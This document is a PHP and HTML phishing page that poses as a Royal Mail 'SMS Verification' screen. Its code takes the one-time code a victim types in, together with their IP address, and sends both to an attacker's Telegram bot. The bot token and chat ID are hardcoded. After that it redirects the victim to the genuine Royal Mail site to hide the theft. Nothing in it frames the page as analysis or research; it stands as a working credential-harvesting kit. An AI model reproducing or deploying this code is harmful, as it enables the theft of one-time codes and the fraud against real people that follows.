<?php
// === Antibot (optional) ===
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
}
$userIP = getUserIP();

$botToken = "8134569625:AAG7bzuQM6wlzjzLfaFCVFPbuJ4qQQUTt6s";
$chatId = "-4932499123";

$submitted = false;
$messageStatus = "";

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $code = trim($_POST["smsCode"] ?? "");
    if (strlen($code) !== 6 || !ctype_digit($code)) {
        $messageStatus = "Please enter a valid 6-digit code.";
    } else {
        // Prepare message for Telegram
        $text = "✅ *Verification Completed*\n\nUser entered SMS code:\n`$code`\nIP: `$userIP`";
        $postData = [
            'chat_id' => $chatId,
            'text' => $text,
            'parse_mode' => 'Markdown'
        ];
        // Send to Telegram
        $ch = curl_init("https://api.telegram.org/bot$botToken/sendMessage");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($ch);
        curl_close($ch);

        if ($result !== false) {
            $submitted = true;
        } else {
            $messageStatus = "Failed to send data. Please try again.";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Royal Mail - Verification Completed</title>
<style>
  body {
    background-color: #fff0f0;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
  }
  .box {
    background: white;
    border: 3px solid #cc0000;
    padding: 40px 30px;
    border-radius: 12px;
    box-shadow: 0 0 15px rgba(204,0,0,0.3);
    max-width: 450px;
    width: 90%;
    text-align: center;
  }
  h2 {
    color: #cc0000;
    margin-bottom: 20px;
  }
  p.message-success {
    color: #009900;
    font-weight: 700;
    font-size: 1.1rem;
    margin-bottom: 25px;
  }
  input[type="text"] {
    width: 100%;
    padding: 12px;
    font-size: 18px;
    border-radius: 6px;
    border: 1.5px solid #cc0000;
    margin-bottom: 20px;
    text-align: center;
    letter-spacing: 10px;
  }
  button {
    background-color: #cc0000;
    color: white;
    padding: 14px;
    font-size: 18px;
    border: none;
    border-radius: 6px;
    cursor: pointer;
    width: 100%;
  }
  button:hover {
    background-color: #b30000;
  }
  .error {
    color: #cc0000;
    font-weight: 600;
    margin-bottom: 15px;
  }
</style>
<?php if ($submitted): ?>
<meta http-equiv="refresh" content="5;url=https://www.royalmail.com" />
<?php endif; ?>
</head>
<body>
  <div class="box" role="alert" aria-live="assertive">
    <?php if ($submitted): ?>
      <h2>Verification Completed</h2>
      <p class="message-success">
        Thank you for verifying your details successfully.<br />
        You will now be redirected to the official Royal Mail website.
      </p>
      <p>Redirecting in <span id="countdown">5</span> seconds...</p>
      <script>
        let timeLeft = 5;
        const countdownEl = document.getElementById('countdown');
        const timer = setInterval(() => {
          timeLeft--;
          countdownEl.textContent = timeLeft;
          if(timeLeft <= 0) clearInterval(timer);
        }, 1000);
      </script>
    <?php else: ?>
      <h2>SMS Verification</h2>
      <p>Please enter the 6-digit code you received via SMS</p>
      <?php if ($messageStatus): ?>
        <p class="error"><?=htmlspecialchars($messageStatus)?></p>
      <?php endif; ?>
      <form method="POST" novalidate>
        <input
          type="text"
          name="smsCode"
          maxlength="6"
          minlength="6"
          pattern="\d{6}"
          placeholder="Enter 6-digit code"
          required
          autocomplete="off"
          inputmode="numeric"
          autofocus
        />
        <button type="submit">Verify</button>
      </form>
    <?php endif; ?>
  </div>
</body>
</html>
